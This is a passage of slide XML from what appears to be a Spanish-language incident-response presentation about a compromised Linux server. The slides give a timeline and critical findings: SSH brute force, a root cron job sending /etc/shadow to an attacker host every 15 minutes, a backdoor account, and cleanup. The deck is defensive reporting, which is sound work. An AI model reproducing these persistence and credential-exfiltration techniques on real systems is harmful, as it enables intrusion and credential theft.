          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="4.54in" svg:width="4in" svg:height="0.22in" draw:id="id84" draw:style-name="a287" draw:name="Text 25">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a286" text:class-names="" text:cond-style-name=""><text:span text:style-name="a284" text:class-names="">Fuerza bruta SSH (192.168.1.103)</text:span><text:span text:style-name="a285" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="4.75in" svg:width="4in" svg:height="0.22in" draw:id="id85" draw:style-name="a291" draw:name="Text 26">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a290" text:class-names="" text:cond-style-name=""><text:span text:style-name="a288" text:class-names="">Múltiples intentos automatizados contra usuarios: test, admin, hacker, root</text:span><text:span text:style-name="a289" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="1.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id86" draw:style-name="a292" draw:name="Shape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in" svg:y="1.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id87" draw:style-name="a296" draw:name="Text 28">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a295" text:class-names="" text:cond-style-name=""><text:span text:style-name="a293" text:class-names="">5</text:span><text:span text:style-name="a294" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="1.68in" svg:width="0in" svg:height="0.55in" draw:id="id88" draw:style-name="a298" draw:name="Shape 2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63in" svg:y="1.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id89" draw:style-name="a302" draw:name="Text 30">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a301" text:class-names="" text:cond-style-name=""><text:span text:style-name="a299" text:class-names="">23 Jun 2025</text:span><text:span text:style-name="a300" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="1.54in" svg:width="4in" svg:height="0.22in" draw:id="id90" draw:style-name="a306" draw:name="Text 31">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a305" text:class-names="" text:cond-style-name=""><text:span text:style-name="a303" text:class-names="">Persistencia instalada</text:span><text:span text:style-name="a304" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="1.75in" svg:width="4in" svg:height="0.22in" draw:id="id91" draw:style-name="a310" draw:name="Text 32">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a309" text:class-names="" text:cond-style-name=""><text:span text:style-name="a307" text:class-names="">Cron sys-maintenance ejecutando backup2.sh como root cada 15 minutos</text:span><text:span text:style-name="a308" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="2.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id92" draw:style-name="a311" draw:name="Shape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in" svg:y="2.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id93" draw:style-name="a315" draw:name="Text 34">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a314" text:class-names="" text:cond-style-name=""><text:span text:style-name="a312" text:class-names="">6</text:span><text:span text:style-name="a313" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="2.68in" svg:width="0in" svg:height="0.55in" draw:id="id94" draw:style-name="a317" draw:name="Shape 3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63in" svg:y="2.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id95" draw:style-name="a321" draw:name="Text 36">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a320" text:class-names="" text:cond-style-name=""><text:span text:style-name="a318" text:class-names="">Desde Jun 23</text:span><text:span text:style-name="a319" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="2.54in" svg:width="4in" svg:height="0.22in" draw:id="id96" draw:style-name="a325" draw:name="Text 37">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a324" text:class-names="" text:cond-style-name=""><text:span text:style-name="a322" text:class-names="">Exfiltración automática activa</text:span><text:span text:style-name="a323" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="2.75in" svg:width="4in" svg:height="0.22in" draw:id="id97" draw:style-name="a329" draw:name="Text 38">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a328" text:class-names="" text:cond-style-name=""><text:span text:style-name="a326" text:class-names="">/etc/shadow comprimido y enviado a 192.168.1.100:8080 cada 15 minutos</text:span><text:span text:style-name="a327" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="3.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id98" draw:style-name="a330" draw:name="Shape 3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in" svg:y="3.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id99" draw:style-name="a334" draw:name="Text 40">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a333" text:class-names="" text:cond-style-name=""><text:span text:style-name="a331" text:class-names="">7</text:span><text:span text:style-name="a332" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.36in" svg:y="3.68in" svg:width="0in" svg:height="0.55in" draw:id="id100" draw:style-name="a336" draw:name="Shape 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63in" svg:y="3.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id101" draw:style-name="a340" draw:name="Text 42">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a339" text:class-names="" text:cond-style-name=""><text:span text:style-name="a337" text:class-names="">18 Jun 2025</text:span><text:span text:style-name="a338" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="3.54in" svg:width="4in" svg:height="0.22in" draw:id="id102" draw:style-name="a344" draw:name="Text 43">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a343" text:class-names="" text:cond-style-name=""><text:span text:style-name="a341" text:class-names="">Detección y respuesta al incidente</text:span><text:span text:style-name="a342" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="3.75in" svg:width="4in" svg:height="0.22in" draw:id="id103" draw:style-name="a348" draw:name="Text 44">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a347" text:class-names="" text:cond-style-name=""><text:span text:style-name="a345" text:class-names="">Análisis forense en vivo — atacante conectado activamente al momento del análisis</text:span><text:span text:style-name="a346" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.2in" svg:y="4.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id104" draw:style-name="a349" draw:name="Shape 4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in" svg:y="4.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id105" draw:style-name="a353" draw:name="Text 46">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a352" text:class-names="" text:cond-style-name=""><text:span text:style-name="a350" text:class-names="">8</text:span><text:span text:style-name="a351" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="4.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id106" draw:style-name="a357" draw:name="Text 47">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a356" text:class-names="" text:cond-style-name=""><text:span text:style-name="a354" text:class-names="">18 Jun 2025</text:span><text:span text:style-name="a355" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="4.54in" svg:width="4in" svg:height="0.22in" draw:id="id107" draw:style-name="a361" draw:name="Text 48">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a360" text:class-names="" text:cond-style-name=""><text:span text:style-name="a358" text:class-names="">Contención, erradicación y cierre</text:span><text:span text:style-name="a359" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.63in" svg:y="4.75in" svg:width="4in" svg:height="0.22in" draw:id="id108" draw:style-name="a365" draw:name="Text 49">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a364" text:class-names="" text:cond-style-name=""><text:span text:style-name="a362" text:class-names="">Sistema limpio verificado — 100% de amenazas eliminadas</text:span><text:span text:style-name="a363" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a371">
          <draw:page-thumbnail draw:page-number="3" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id109" presentation:style-name="a366" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id110" presentation:style-name="a367" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id111" presentation:style-name="a370" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a369" text:class-names="" text:cond-style-name=""><text:span text:style-name="a368" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">3</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 4" draw:style-name="a372" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-259">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id112" draw:style-name="a373" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id113" draw:style-name="a374" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image9.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id114" draw:style-name="a378" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a377" text:class-names="" text:cond-style-name=""><text:span text:style-name="a375" text:class-names="">Lo que encontramos — Hallazgos Críticos</text:span><text:span text:style-name="a376"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115" draw:style-name="a382" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a381" text:class-names="" text:cond-style-name=""><text:span text:style-name="a379" text:class-names="">8 hallazgos identificados durante el análisis forense en vivo del servidor activo</text:span><text:span text:style-name="a380" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.72in" svg:height="0.9in" draw:id="id116" draw:style-name="a383" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.72in" svg:height="0.9in" draw:id="id117" draw:style-name="a384" draw:name="Shape 4">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="1in" svg:height="0.9in" draw:id="id118" draw:style-name="a385" draw:name="Shape 5">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id119" draw:style-name="a386" draw:name="Image 1" svg:x="0.54in" svg:y="1.48in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image5.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.42in" svg:y="1.34in" svg:width="3.5in" svg:height="0.24in" draw:id="id120" draw:style-name="a390" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a389" text:class-names="" text:cond-style-name=""><text:span text:style-name="a387" text:class-names="">CRÍTICO</text:span><text:span text:style-name="a388" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="1.56in" svg:width="3.5in" svg:height="0.3in" draw:id="id121" draw:style-name="a394" draw:name="Text 7">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a393" text:class-names="" text:cond-style-name=""><text:span text:style-name="a391" text:class-names="">Conexión del atacante activa</text:span><text:span text:style-name="a392" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="1.84in" svg:width="3.5in" svg:height="0.28in" draw:id="id122" draw:style-name="a398" draw:name="Text 8">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a397" text:class-names="" text:cond-style-name=""><text:span text:style-name="a395" text:class-names="">El atacante estaba conectado via SSH al momento del análisis (192.168.1.48, PID 1725)</text:span><text:span text:style-name="a396" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="1.28in" svg:width="4.72in" svg:height="0.9in" draw:id="id123" draw:style-name="a399" draw:name="Shape 9">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="1.28in" svg:width="4.72in" svg:height="0.9in" draw:id="id124" draw:style-name="a400" draw:name="Shape 10">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="1.28in" svg:width="1in" svg:height="0.9in" draw:id="id125" draw:style-name="a401" draw:name="Shape 11">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id126" draw:style-name="a402" draw:name="Image 2" svg:x="5.4in" svg:y="1.48in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image10.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="6.28in" svg:y="1.34in" svg:width="3.5in" svg:height="0.24in" draw:id="id127" draw:style-name="a406" draw:name="Text 12">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a405" text:class-names="" text:cond-style-name=""><text:span text:style-name="a403" text:class-names="">CRÍTICO</text:span><text:span text:style-name="a404" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="1.56in" svg:width="3.5in" svg:height="0.3in" draw:id="id128" draw:style-name="a410" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a409" text:class-names="" text:cond-style-name=""><text:span text:style-name="a407" text:class-names="">2 cuentas no autorizadas</text:span><text:span text:style-name="a408" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="1.84in" svg:width="3.5in" svg:height="0.28in" draw:id="id129" draw:style-name="a414" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a413" text:class-names="" text:cond-style-name=""><text:span text:style-name="a411" text:class-names="">Cuentas 'hacker' (backdoor) y 'reports' (comprometida) con shell interactiva activa</text:span><text:span text:style-name="a412" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.33in" svg:width="4.72in" svg:height="0.9in" draw:id="id130" draw:style-name="a415" draw:name="Shape 15">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.33in" svg:width="4.72in" svg:height="0.9in" draw:id="id131" draw:style-name="a416" draw:name="Shape 16">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="2.33in" svg:width="1in" svg:height="0.9in" draw:id="id132" draw:style-name="a417" draw:name="Shape 17">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id133" draw:style-name="a418" draw:name="Image 3" svg:x="0.54in" svg:y="2.53in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image6.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.42in" svg:y="2.39in" svg:width="3.5in" svg:height="0.24in" draw:id="id134" draw:style-name="a422" draw:name="Text 18">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a421" text:class-names="" text:cond-style-name=""><text:span text:style-name="a419" text:class-names="">CRÍTICO</text:span><text:span text:style-name="a420" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="2.61in" svg:width="3.5in" svg:height="0.3in" draw:id="id135" draw:style-name="a426" draw:name="Text 19">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a425" text:class-names="" text:cond-style-name=""><text:span text:style-name="a423" text:class-names="">Exfiltración automática cada 15 min</text:span><text:span text:style-name="a424" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="2.89in" svg:width="3.5in" svg:height="0.28in" draw:id="id136" draw:style-name="a430" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a429" text:class-names="" text:cond-style-name=""><text:span text:style-name="a427" text:class-names="">Cron malicioso enviando /etc/shadow al servidor del atacante cada 15 minutos</text:span><text:span text:style-name="a428" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="2.33in" svg:width="4.72in" svg:height="0.9in" draw:id="id137" draw:style-name="a431" draw:name="Shape 21">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="2.33in" svg:width="4.72in" svg:height="0.9in" draw:id="id138" draw:style-name="a432" draw:name="Shape 22">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="2.33in" svg:width="1in" svg:height="0.9in" draw:id="id139" draw:style-name="a433" draw:name="Shape 23">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id140" draw:style-name="a434" draw:name="Image 4" svg:x="5.4in" svg:y="2.53in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image7.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="6.28in" svg:y="2.39in" svg:width="3.5in" svg:height="0.24in" draw:id="id141" draw:style-name="a438" draw:name="Text 24">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a437" text:class-names="" text:cond-style-name=""><text:span text:style-name="a435" text:class-names="">CRÍTICO</text:span><text:span text:style-name="a436" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="2.61in" svg:width="3.5in" svg:height="0.3in" draw:id="id142" draw:style-name="a442" draw:name="Text 25">
